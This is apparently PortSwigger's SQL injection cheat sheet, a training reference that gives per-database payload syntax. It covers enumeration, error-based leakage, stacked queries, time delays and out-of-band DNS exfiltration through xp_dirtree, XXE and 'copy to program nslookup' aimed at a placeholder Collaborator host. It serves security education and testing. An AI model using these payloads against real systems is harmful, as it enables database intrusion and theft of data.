This [SQL injection](https://portswigger.net/web-security/sql-injection) cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

## String concatenation

You can concatenate together multiple strings to make a single string.

<table><tbody><tr><th>Oracle</th><td><code>'foo'||'bar'</code></td></tr><tr><th>Microsoft</th><td><code>'foo'+'bar'</code></td></tr><tr><th>PostgreSQL</th><td><code>'foo'||'bar'</code></td></tr><tr><th>MySQL</th><td><code>'foo' 'bar'</code> [Note the space between the two strings]<br><code>CONCAT('foo','bar')</code><br></td></tr></tbody></table>

## Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

<table><tbody><tr><th>Oracle</th><td><code>SUBSTR('foobar', 4, 2)</code></td></tr><tr><th>Microsoft</th><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr><tr><th>PostgreSQL</th><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr><tr><th>MySQL</th><td><code>SUBSTRING('foobar', 4, 2)</code></td></tr></tbody></table>

You can use comments to truncate a query and remove the portion of the original query that follows your input.

<table><tbody><tr><th>Oracle</th><td><code>--comment<br></code></td></tr><tr><th>Microsoft</th><td><code>--comment<br>/*comment*/</code></td></tr><tr><th>PostgreSQL</th><td><code>--comment<br>/*comment*/</code></td></tr><tr><th>MySQL</th><td><code>#comment</code><br><code>-- comment</code> [Note the space after the double dash]<br><code>/*comment*/</code></td></tr></tbody></table>

## Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

<table><tbody><tr><th>Oracle</th><td><code>SELECT banner FROM v$version<br>SELECT version FROM v$instance<br></code></td></tr><tr><th>Microsoft</th><td><code>SELECT @@version</code></td></tr><tr><th>PostgreSQL</th><td><code>SELECT version()</code></td></tr><tr><th>MySQL</th><td><code>SELECT @@version</code></td></tr></tbody></table>

## Database contents

You can list the tables that exist in the database, and the columns that those tables contain.

<table><tbody><tr><th>Oracle</th><td><code>SELECT * FROM all_tables<br>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code></td></tr><tr><th>Microsoft</th><td><code>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br></code></td></tr><tr><th>PostgreSQL</th><td><code>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br></code></td></tr><tr><th>MySQL</th><td><code>SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br></code></td></tr></tbody></table>

## Conditional errors

You can test a single boolean condition and trigger a database error if the condition is true.

<table><tbody><tr><th>Oracle</th><td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></td></tr><tr><th>Microsoft</th><td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td></tr><tr><th>PostgreSQL</th><td><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)</code></td></tr><tr><th>MySQL</th><td><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</code></td></tr></tbody></table>

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

<table><tbody><tr><th>Microsoft</th><td><code>SELECT 'foo' WHERE 1 = (SELECT 'secret')<p>&gt; Conversion failed when converting the varchar value 'secret' to data type int.</p></code></td></tr><tr><th>PostgreSQL</th><td><code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int)<p>&gt; invalid input syntax for integer: "secret"</p></code></td></tr><tr><th>MySQL</th><td><code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))<p>&gt; XPATH syntax error: '\secret'</p></code></td></tr></tbody></table>

## Batched (or stacked) queries

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

<table><tbody><tr><th>Oracle</th><td><code>Does not support batched queries.</code></td></tr><tr><th>Microsoft</th><td><code>QUERY-1-HERE; QUERY-2-HERE<br>QUERY-1-HERE QUERY-2-HERE</code></td></tr><tr><th>PostgreSQL</th><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr><tr><th>MySQL</th><td><code>QUERY-1-HERE; QUERY-2-HERE</code></td></tr></tbody></table>

#### Note

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

## Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

<table><tbody><tr><th>Oracle</th><td><code>dbms_pipe.receive_message(('a'),10)</code></td></tr><tr><th>Microsoft</th><td><code>WAITFOR DELAY '0:0:10'</code></td></tr><tr><th>PostgreSQL</th><td><code>SELECT pg_sleep(10)</code></td></tr><tr><th>MySQL</th><td><code>SELECT SLEEP(10)</code></td></tr></tbody></table>

## Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.

<table><tbody><tr><th>Oracle</th><td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</code></td></tr><tr><th>Microsoft</th><td><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</code></td></tr><tr><th>PostgreSQL</th><td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td></tr><tr><th>MySQL</th><td><code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')</code></td></tr></tbody></table>

## DNS lookup

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

<table><tbody><tr><th>Oracle</th><td><p>(<a href="https://portswigger.net/web-security/xxe">XXE</a>) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:</p><code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</code><p>The following technique works on fully patched Oracle installations, but requires elevated privileges:</p><code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</code></td></tr><tr><th>Microsoft</th><td><code>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'</code></td></tr><tr><th>PostgreSQL</th><td><code>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'</code></td></tr><tr><th>MySQL</th><td><p>The following techniques work on Windows only:</p><code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code><br><code>SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></td></tr></tbody></table>

## DNS lookup with data exfiltration

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

<table><tbody><tr><th>Oracle</th><td><code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</code></td></tr><tr><th>Microsoft</th><td><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')</code></td></tr><tr><th>PostgreSQL</th><td><code>create OR replace function f() returns void as $$<br>declare c text;<br>declare p text;<br>begin<br>SELECT into p (SELECT YOUR-QUERY-HERE);<br>c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';<br>execute c;<br>END;<br>$$ language plpgsql security definer;<br>SELECT f();</code></td></tr><tr><th>MySQL</th><td>The following technique works on Windows only:<br><code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></td></tr></tbody></table>